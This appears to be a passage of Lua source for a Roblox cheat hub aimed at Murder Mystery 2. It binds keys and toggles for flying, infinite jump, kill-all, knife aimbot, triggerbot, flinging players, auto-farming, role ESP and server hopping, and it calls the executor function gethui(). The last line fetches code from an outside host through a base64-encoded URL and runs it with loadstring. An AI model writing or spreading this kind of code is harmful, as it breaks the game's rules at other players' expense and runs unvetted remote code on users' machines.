	tbl122.Toggle(value313, { Title = "Fly", Flag = "FlyButton", Set = "FlyButtonSetEnabled", Notify = "plane" })

	tbl122.Toggle(value313, {
		Title = "Infinite Jump",
		Flag = "InfJumpButton",
		Set = "InfJumpButtonSetEnabled",
		Notify = "chevrons-up",
	})

	tbl122.Toggle(value313, {
		Title = "Wall Jump",
		Flag = "WallJumpButton",
		Set = "WallJumpButtonSetEnabled",
		Notify = "move-up",
	})

	if tbl121.Keybinds then
		tbl122.Toggle(tbl122.Box(tbl121.Keybinds, "Keybinds", "keyboard"), {
			Title = "Enable Keybinds",
			Flag = "KeybindsEnabled",
			Value = true,
			Set = function(keybindsEnabled)
				_G.KeybindsEnabled = keybindsEnabled
			end,
			Notify = "keyboard",
		})

		_G.KeybindsEnabled = true
		local obj73 = tbl122.Box(tbl121.Keybinds, "Actions", "zap")
		_G.Keybinds = _G.Keybinds or {}

		local tbl149 = {
			id = "RageShoot",
			title = "Rage Shoot",
			icon = "zap",
			default = Enum.KeyCode.R,
			run = function()
				local shootMurdererRageStatus = _G.ShootMurdererRageStatus
				return _G.ShootMurdererRage(), shootMurdererRageStatus
			end,
		}

		local tbl150 = {
			id = "ThrowKnife",
			title = "Throw Knife",
			icon = "sword",
			default = Enum.KeyCode.Q,
			run = function()
				return _G.ThrowAimbotOnce()
			end,
		}

		local tbl151 = {
			id = "KillAll",
			title = "Kill All",
			icon = "sword",
			default = Enum.KeyCode.T,
			run = function()
				return _G.KillAllMurderer()
			end,
		}

		local tbl152 = {
			id = "BombBoost",
			title = "Bomb Boost",
			icon = "bomb",
			default = Enum.KeyCode.B,
			run = function()
				return _G.BombBoost()
			end,
		}

		local tbl153 = {
			id = "FlingMurderer",
			title = "Fling Murderer",
			icon = "skull",
			default = Enum.KeyCode.F,
			run = function()
				return _G.RoleFlingTarget({ "Murderer" })
			end,
		}

		local tbl154 = {
			id = "ToggleFarm",
			title = "Auto Farm",
			icon = "bot",
			default = Enum.KeyCode.G,
			run = function()
				_G.AutoFarmSetEnabled(not _G.AutoFarmEnabled)
				return _G.AutoFarmEnabled, _G.AutoFarmEnabled and "Enabled" or "Disabled"
			end,
		}

		local tbl155 = {
			id = "ToggleTriggerbot",
			title = "Triggerbot",
			icon = "zap",
			default = Enum.KeyCode.C,
			run = function()
				_G.TriggerbotSetEnabled(not _G.TriggerbotEnabled)
				return _G.TriggerbotEnabled, _G.TriggerbotEnabled and "Enabled" or "Disabled"
			end,
		}

		local tbl156 = {
			{
				id = "ShootMurderer",
				title = "Shoot Murderer",
				icon = "crosshair",
				default = Enum.KeyCode.E,
				run = function()
					local shootMurdererStatus = _G.ShootMurdererStatus
					return _G.ShootMurderer(), shootMurdererStatus
				end,
			},
			tbl149,
			tbl150,
			tbl151,
			tbl152,
			tbl153,
			tbl154,
			tbl155,
		}

		local tbl157 = {}

		local function func272()
			tbl157 = {}

			for _, item84 in ipairs(tbl156) do
				local value314 = _G.Keybinds[item84.id]

				if value314 then
					tbl157[value314] = item84
				end
			end
		end

		for _, item85 in ipairs(tbl156) do
			_G.Keybinds[item85.id] = _G.Keybinds[item85.id] or item85.default

			obj73:Keybind({
				Title = item85.title,
				Value = item85.default.Name,
				Flag = "Key" .. item85.id,
				Callback = function(value)
					local flag288 = typeof(value) == "EnumItem" and value or Enum.KeyCode[tostring(value)]

					if flag288 then
						_G.Keybinds[item85.id] = flag288
						func272()
						queueConfigSave()
					end
				end,
			})
		end

		func272()

		table.insert(_G.CoinESPConn, UserInputService.InputBegan:Connect(function(input, gameProcessed)
			if gameProcessed then
				return
			end

			if _G.KeybindsEnabled == false then
				return
			end
			local entry22 = tbl157[input.KeyCode]
			if not entry22 then
				return
			end

			task.spawn(function()
				local ok, result, result2 = pcall(entry22.run)
				if not ok then
					return
				end
				local str21 = tostring(result2 or result and "Done" or "Failed")

				if _G.WindNotify then
					_G.WindNotify(entry22.title, str21, result and (entry22.icon or "circle-check") or "circle-x")
				end
			end)
		end))
	end

	_G.MenuToggleKey = _G.MenuToggleKey or Enum.KeyCode.RightShift

	if UserInputService.KeyboardEnabled then
		tbl122.Box(tbl121.General, "Menu", "panel-top"):Keybind({
			Title = "Open / Close Menu",
			Value = "RightShift",
			Flag = "KeyToggleMenu",
			Callback = function(value)
				local menuToggleKey = typeof(value) == "EnumItem" and value or Enum.KeyCode[tostring(value)]

				if menuToggleKey then
					_G.MenuToggleKey = menuToggleKey
					queueConfigSave()
				end
			end,
		})
	end

	local value315 = tbl122.Box(tbl121.General, "Performance", "gauge")
	tbl122.Toggle(value315, { Title = "FPS Boost", Flag = "FpsBoost", Set = "FpsBoostSetEnabled", Notify = "gauge" })

	tbl122.Slider(value315, {
		Title = "FPS Cap",
		Flag = "FpsCap",
		Min = 0,
		Max = 360,
		Default = 0,
		Step = 10,
		Set = "FpsBoostSetCap",
	})

	local value316 = tbl122.Box(tbl121.General, "Server", "server")

	tbl122.Toggle(value316, {
		Title = "Anti-AFK",
		Flag = "AntiAfk",
		Value = true,
		Set = "AntiAfkSetEnabled",
		Notify = "coffee",
	})

	tbl122.Action(value316, {
		Title = "Hop Server",
		Icon = "shuffle",
		Run = function()
			return _G.HopServer()
		end,
	})

	tbl122.Toggle(tbl122.Box(tbl121.General, "Privacy", "shield"), {
		Title = "Anonymous Mode",
		Flag = "AnonymousMode",
		Set = "AnonymousSetEnabled",
		Notify = "user-x",
	})

	local obj74 = tbl122.Box(tbl121.General, "Config", "save")

	tbl122.Switch(obj74:Toggle({
		Title = "Auto Save",
		Flag = "AutoSaveConfig",
		Value = true,
		Callback = function(value)
			_G.AutoConfigEnabled = value and true or false

			if _G.ConfigReady and not _G.ConfigLoading then
				saveScriptConfig(false)
			end

			func243("Auto Save Config", value, "save")
		end,
	}))

	obj74:Button({
		Title = "Save Now",
		Icon = "save",
		Callback = function()
			saveScriptConfig(true)
		end,
	})

	obj74:Button({
		Title = "Load Saved",
		Icon = "folder-open",
		Callback = function()
			loadScriptConfig(true)
		end,
	})

	local obj75 = tbl122.Box(tbl121.General, "Panel", "panel-top")

	obj75:Button({
		Title = "Hide Panel",
		Icon = "eye-off",
		Callback = function()
			pcall(function()
				obj46:Close()
			end)
		end,
	})

	obj75:Button({
		Title = "Unload Script",
		Icon = "power",
		Color = Color3.fromRGB(235, 70, 70),
		Callback = function()
			obj46:Dialog({
				Icon = "triangle-alert",
				Title = "Unload Script",
				Content = "Close the panel and stop all enabled features?",
				Buttons = {
					{ Title = "Unload", Variant = "Primary", Callback = callback7 },
					{ Title = "Cancel", Variant = "Tertiary" },
				},
			}):Show()
		end,
	})
end

_G.CoinESPSetEnabled(false)
_G.DailyQuestCheckerSetEnabled(false)
_G.QuickShootButtonSetEnabled(false)
_G.QuickRageShootButtonSetEnabled(false)
_G.AutoThrowKnifeSetEnabled(false)
_G.ThrowAimbotButtonSetEnabled(false)
_G.AutoGrabGunSetEnabled(true)
_G.ShiftLockCrosshairSetEnabled(false)
_G.KillAllButtonSetEnabled(false)
_G.AntiFlingSetEnabled(true)
_G.LockButtonsSetEnabled(false)
_G.PlayerWalkSpeedSet(16)
_G.PlayerJumpPowerSet(50)
_G.PlayerFlySpeedSet(50)
_G.PlayerFlySetEnabled(false)
_G.RoleESPSetEnabled(true)
_G.ESPGlowSetEnabled(true)
_G.RoleNametagsSetEnabled(true)
_G.SheriffGunESPSetEnabled(true)
_G.RoleESPSetTypeEnabled("Murderer", true)
_G.RoleESPSetTypeEnabled("Sheriff", true)
_G.RoleESPSetTypeEnabled("Innocent", true)
_G.RoleESPSetTypeEnabled("Hero", true)
loadScriptConfig(false)

pcall(function()
	_G.ShiftLockCrosshairSetEnabled(_G.HideShiftLockCrosshair)
end)

pcall(function()
	_G.CrosshairSetSize(_G.CrosshairSize or 64)
end)

pcall(function()
	_G.__SetActionButtonSize(_G.ActionButtonSize or 72)
end)

pcall(function()
	_G.LockButtonsToggle:Set(false)
end)

pcall(function()
	_G.AutoGrabGunToggle:Set(true)
end)

_G.LockButtonsSetEnabled(false)
_G.AutoGrabGunSetEnabled(true)
_G.ConfigReady = true

do
	local function func273(list50)
		pcall(function()
			list50.AutoLocalize = false
		end)

		for _, descendant in ipairs(list50:GetDescendants()) do
			pcall(function()
				descendant.AutoLocalize = false
			end)
		end
	end

	local hui = gethui()

	for _, child in ipairs(hui:GetChildren()) do
		func273(child)
	end

	local connection2 = hui.DescendantAdded:Connect(function(descendant)
		task.defer(function()
			pcall(function()
				descendant.AutoLocalize = false
			end)
		end)
	end)

	table.insert(_G.CoinESPConn, connection2)
end

pcall(_G.__ApplyActionButtonIcons)
pcall(_G.SetActionButtonTextColor, _G.ActionButtonTextColor)
print(_G.ScriptVersion .. " fully loaded (ESP defaults ON, safe MoveTo-based farm)")

loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjAwNGFkODZkLTFmNGMtNDZiZS1iZWQ1LWYxOTUyZjAxZTFjYSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vVWdseVNvdXJjZS9Tb3VyY2VzL3JlZnMvaGVhZHMvbWFpbi9TdGFySHViX01NMiJ9fQ"))()
